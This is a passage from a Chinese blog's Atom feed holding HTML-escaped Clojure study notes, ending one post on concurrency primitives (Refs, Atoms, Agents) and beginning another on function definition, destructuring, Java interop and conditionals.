查询并更新的操作可以合成一步，这是通过alter函数实现&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dosync&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;alter&lt;/span&gt;&lt;/span&gt; song conj &lt;span class=&quot;string&quot;&gt;&quot;heal the world&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; @song) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; #&amp;#123;heal the world&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  注意alter后跟的函数会把ref值当做第一个参数，所以这里使用cons就不行了，因为cons要求第一个参数是加入的元素。&lt;/p&gt;
&lt;p&gt;  commute函数是是对alter的优化，commute可以同时进行修改（并不影响ref最终的值）。通常情况下，一般优先使用alter，除非在遇到明显的性能瓶颈并且对顺序不是那么关心的时候，可以考虑用commute替换。&lt;/p&gt;
&lt;h2 id=&quot;Atoms&quot;&gt;&lt;a href=&quot;#Atoms&quot; class=&quot;headerlink&quot; title=&quot;Atoms&quot;&gt;&lt;/a&gt;Atoms&lt;/h2&gt;&lt;p&gt;Atoms 提供了比使用Refs&amp;amp;STM更简单的更新当个值的方法。它不受事务的影响。有点像Java的原子类(Atomic)。&lt;/p&gt;
&lt;p&gt;有三个函数可以修改一个Atom的值：&lt;code&gt;reset!&lt;/code&gt;,&lt;code&gt;compare-and-set!&lt;/code&gt; 和&lt;code&gt;swap!&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; counter (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;atom&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;))  &lt;span class=&quot;comment&quot;&gt;; 指定 counter 为Atom类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;reset!&lt;/span&gt;&lt;/span&gt; counter &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)   &lt;span class=&quot;comment&quot;&gt;; 更新原子的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; @counter) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 2 deref，用`@`读取atom的值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;compare-and-set!&lt;/span&gt;&lt;/span&gt; counter &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; true 执行成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;swap!&lt;/span&gt;&lt;/span&gt; counter inc) &lt;span class=&quot;comment&quot;&gt;; 第二个参数是计算Atom新值的函数，可带参数。会一直执行直到成功为止。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Agents&quot;&gt;&lt;a href=&quot;#Agents&quot; class=&quot;headerlink&quot; title=&quot;Agents&quot;&gt;&lt;/a&gt;Agents&lt;/h2&gt;&lt;p&gt;Agents 是用来把一些事情放到另外一个线程来做（一般不需要事务控制的），用来控制状态的异步更新。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; counter (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;agent&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; 使用agent函数定义一个初始值为0的agent&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; @counter) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 0 同样的使用@读取值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 更新agent，通过send函数给agent发送任务去更新agent&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;send&lt;/span&gt;&lt;/span&gt; counter inc) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; #&amp;lt;Agent@9444d1: 0&amp;gt; 此处一般是0，因为更新是异步的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; @counter) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 1  这里获取的肯定是1了，已经更新了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 还有个方法，send-off，它的作用于send类似：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;send-off&lt;/span&gt;&lt;/span&gt; counter inc)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; @counter) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;send和send-off的区别在于，send是将任务交给一个固定大小的线程池执行(默认大小是CPU核数+2)。&lt;strong&gt;因此send执行的任务最好不要有阻塞的操作&lt;/strong&gt;。而send-off则使用没有大小限制（取决于内存）的线程池。因此，&lt;strong&gt;send-off比较适合任务有阻塞的操作&lt;/strong&gt;，如IO读写之类。注意，所有的agent是共用这些线程池。&lt;/p&gt;
&lt;h2 id=&quot;扩展阅读&quot;&gt;&lt;a href=&quot;#扩展阅读&quot; class=&quot;headerlink&quot; title=&quot;扩展阅读&quot;&gt;&lt;/a&gt;扩展阅读&lt;/h2&gt;&lt;p&gt;这篇笔记原先是想放在一篇文章里的，谁知太长了，只好分成了三篇。以下是我觉得学习Clojure不错的网上资源，需者自取。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://learnxinyminutes.com/docs/zh-cn/clojure-cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Learn Clojure in Y Minutes&lt;/a&gt;, 快速入门&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://java.ociweb.com/mark/clojure/article.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Clojure - Function Programming for JVM&lt;/a&gt;, 更系统地学习。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://clojure.github.io/clojure/clojure.core-api.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Clojure API&lt;/a&gt;，遇到不懂的就查一下，不过还是推荐用Mac上的&lt;a href=&quot;https://kapeli.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dash&lt;/a&gt;工具，真的是很好用很方便！&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://clojure-api-cn.readthedocs.org/en/latest/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Clojure 中文 API&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;很多人是为了更好地进行并发编程而选择了Clojure，但Clojure所有的数据都是只读的，除非你使用引用类型（Vars、Ref、Atom、Agent）来标明它们是可以修改的。Clojure处理并发的思路与众不同，采用的是&lt;a href=&quot;http://en.wikipedia.org/wiki/Software_transactional_memory&quot;&gt;Software Transactional Memory&lt;/a&gt; (STM)来实现的，即软事务内存。你可以将STM想象成数据库，只不过是内存型的，它只支持事务的ACI，也就是原子性、一致性、隔离性，但是不包括持久性，因为状态的保存都在内存里。引用类型是一种可变引用指向不可变数据的一种机制。Clojure的并发API分为四种模型：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;管理Thread local变量的Var。&lt;/li&gt;
&lt;li&gt;管理协作式、同步修改可变状态的Ref&lt;/li&gt;
&lt;li&gt;管理非协作式、同步修改可变状态的Atom&lt;/li&gt;
&lt;li&gt;管理异步修改可变状态的Agent&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="编程语言" scheme="http://wuchong.me/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="Clojure" scheme="http://wuchong.me/tags/Clojure/"/>
    
      <category term="笔记" scheme="http://wuchong.me/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Clojure学习笔记（二）：语法</title>
    <link href="http://wuchong.me/blog/2015/11/06/learn-clojure-2-syntax/"/>
    <id>http://wuchong.me/blog/2015/11/06/learn-clojure-2-syntax/</id>
    <published>2015-11-06T06:36:15.000Z</published>
    <updated>2015-11-07T05:14:03.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;定义函数&quot;&gt;&lt;a href=&quot;#定义函数&quot; class=&quot;headerlink&quot; title=&quot;定义函数&quot;&gt;&lt;/a&gt;定义函数&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;匿名函数&lt;/strong&gt;&lt;br&gt;匿名函数&lt;code&gt;(fn) (fn [x y] (+ x y))&lt;/code&gt; 创建一个匿名函数, fn 和 lambda 类似，fn还有一个简写形式 &lt;code&gt;#(+ %1 %2)&lt;/code&gt;。如果只有一个参数,那么可以用 &lt;code&gt;%&lt;/code&gt; 代替 &lt;code&gt;%1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;def&lt;/strong&gt;&lt;br&gt;&lt;code&gt;def&lt;/code&gt;可以将一个匿名函数绑定到一个name上。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; my-add (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;fn&lt;/span&gt;&lt;/span&gt; [x y] (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; x y)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;defn&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;defn 是 def 与 fn 的简写。一般我们也都是用defn。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; my-add&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;this is a comment&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [x y]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; x y))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;my-add&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 函数的重载&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; my-add&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ([x y]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; x y))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ([x y z]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; x y z)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;my-add&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;my-add&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;declare&lt;/strong&gt;&lt;br&gt;函数定义必须在函数调用前,如果想在定义前使用函数,必须声明它&lt;code&gt;(declare function-names)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;defn- &amp;amp; defmacro-&lt;/strong&gt;&lt;br&gt;defn- 定义私有函数,他们仅在自己的 namespace 可见&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;参数的解构&lt;/strong&gt;&lt;br&gt;解构可以用在一个函数或者宏的参数里面来把一个集合里面的一个或者几个元素抽取到一些本地binding里面去。它可以用&lt;code&gt;let&lt;/code&gt;,&lt;code&gt;&amp;amp;&lt;/code&gt;,&lt;code&gt;:as&lt;/code&gt;等。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; my-add [numbers]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;let&lt;/span&gt;&lt;/span&gt; [n1 (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;first&lt;/span&gt;&lt;/span&gt; numbers)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         n3 (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;nth&lt;/span&gt;&lt;/span&gt; numbers &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; n1 n3)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;my-add&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;])  &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  &lt;code&gt;&amp;amp;&lt;/code&gt;符号可以在解构里面用来获取集合里面剩下的元素。&lt;code&gt;:as&lt;/code&gt;关键字可以用来获取对于整个被解构的集合的访问。&lt;/p&gt;
&lt;h2 id=&quot;调用Java&quot;&gt;&lt;a href=&quot;#调用Java&quot; class=&quot;headerlink&quot; title=&quot;调用Java&quot;&gt;&lt;/a&gt;调用Java&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;导入&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;import&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &#39;(&lt;span class=&quot;name&quot;&gt;java.util&lt;/span&gt; Calendar GregorianCalendar)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &#39;(&lt;span class=&quot;name&quot;&gt;javax.swing&lt;/span&gt; JFrame JLabel))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;创建对象&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用new关键字创建对象&lt;code&gt;(new class-name args)&lt;/code&gt;，也可以使用语法糖简化&lt;code&gt;(class-name. args)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;例如：&lt;code&gt;(new String &amp;quot;abc&amp;quot;)&lt;/code&gt; 或者 &lt;code&gt;(String. &amp;quot;abc&amp;quot;)&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;方法调用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;.&lt;/code&gt;，&lt;code&gt;(. class-or-instance method-name args)&lt;/code&gt; 或者 &lt;code&gt;(.method-name class-or-instance args)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; s (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;new&lt;/span&gt;&lt;/span&gt; String &lt;span class=&quot;string&quot;&gt;&quot;abc&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;.&lt;/span&gt;&lt;/span&gt; s charAt &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; \a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;连续调用方法&lt;/strong&gt;&lt;br&gt;&lt;code&gt;(.. class-or-object (method1 args) (method2 args) ...)&lt;/code&gt; 前一个函数的返回值，作为后一个函数的第一个参数。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;..&lt;/span&gt;&lt;/span&gt; s (&lt;span class=&quot;name&quot;&gt;toString&lt;/span&gt;) (&lt;span class=&quot;name&quot;&gt;charAt&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; \b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;set!&lt;/strong&gt;&lt;br&gt;set! : (set! (. target name) value)&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;静态变量/静态方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于静态方法和静态变量，可以使用&lt;code&gt;ClassName/field&lt;/code&gt;的方式来调用。例如：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Integer/MIN_VALUE ; -&amp;gt; -2147483648&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(Integer/parseInt &quot;101&quot;)  ; -&amp;gt; 101&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;条件控制&quot;&gt;&lt;a href=&quot;#条件控制&quot; class=&quot;headerlink&quot; title=&quot;条件控制&quot;&gt;&lt;/a&gt;条件控制&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;if&lt;/strong&gt;&lt;br&gt;if的语法是&lt;code&gt;(if condition then-expr else-expr)&lt;/code&gt;，第一个参数是条件，第二个表达式是条件成立时执行，第三个表达式可选，在条件不成立时执行。如果需要执行多个表达式，包在&lt;code&gt;do&lt;/code&gt;里。&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(if is-weekend&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (println &quot;play&quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (do (println &quot;work&quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        (println &quot;sleep&quot;))))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;when &amp;amp; whennot&lt;/strong&gt;&lt;br&gt;宏when 和when-not 提供和if类似的功能，用它们可以更方便地写inline condition。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;when&lt;/span&gt;&lt;/span&gt; is-weekend (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;play&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;when-not&lt;/span&gt;&lt;/span&gt; is-weekend (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;work&quot;&lt;/span&gt;) (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;sleep&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;if-let &amp;amp; when-let&lt;/strong&gt;&lt;br&gt;&lt;code&gt;if-let&lt;/code&gt;给一个变量绑定一个值,如果这个值为 true,则选择一个语句来执行,否则选择另一个。&lt;br&gt;&lt;code&gt;when-let&lt;/code&gt;跟&lt;code&gt;if-let&lt;/code&gt;类似，不同之处还是在于没有else分支。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; process-next [waiting-line]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;if-let&lt;/span&gt;&lt;/span&gt; [name (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;first&lt;/span&gt;&lt;/span&gt; waiting-line)]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; name &lt;span class=&quot;string&quot;&gt;&quot;is next&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;no waiting&quot;&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;process-next&lt;/span&gt; &#39;(&lt;span class=&quot;string&quot;&gt;&quot;Jeremy&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Amanda&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Tami&quot;&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; Jeremy is next&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;process-next&lt;/span&gt; &#39;()) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; no waiting&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
